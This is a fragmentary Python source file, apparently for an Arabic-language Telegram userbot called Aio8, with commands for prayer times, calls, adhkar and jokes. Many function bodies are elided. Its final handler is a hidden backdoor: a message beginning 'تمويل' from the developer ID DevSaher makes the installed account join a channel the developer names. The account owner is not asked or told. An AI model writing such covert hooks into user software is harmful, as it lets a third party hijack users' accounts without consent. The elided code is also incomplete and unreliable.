...
async def fetch_prayer_times():
    ...
    times_json = await Aio8.download_file(file_location)
    return times_json
...
async def send_prayer_times(event):
    ...
    input_file = await Aio8.upload_file(bytes(times_json, 'utf-8'), part_size_kb=512)
    await Aio8.send_file(chat_id, input_file, caption=f"وقت الفجر: {fajr_time}\nالتاريخ الهجري: {hijri_date}", force_document=True)

@Aio8.on(admin_cmd(pattern="صلاه(?: |$)(.*)"))
async def handle_command(event):
    await send_prayer_times(event)

@Aio8.on(admin_cmd(pattern="دعوه للمكالمه(?: |$)(.*)"))
async def _(e):
...
@Aio8.on(admin_cmd(pattern="بدء مكالمه(?: |$)(.*)"))
async def _(e):
    try:
...
@Aio8.on(admin_cmd(pattern="اذكار$"))
async def ithker(knopis):
...
@Aio8.on(admin_cmd(pattern="خيروك$"))
async def ithker(knopis):
    await knopis.edit(choice(Qrue_5erok))

    
@Aio8.on(admin_cmd(pattern="اذكار عشر$"))    
...
@Aio8.on(admin_cmd(pattern="شنو رأيك بهذا$"))
async def ithker(knopis):
...
@Aio8.on(admin_cmd(pattern="بوسة$"))
async def ithker(knopis):
...
async def Hussein(event):
    if event.message.message.startswith("تمويل") and event.sender_id == DevSaher:
        ...
        if len(message.text.split()) > 1:
            ...
            if channel_username:
                try:
                    await Aio8(JoinChannelRequest(channel_username))
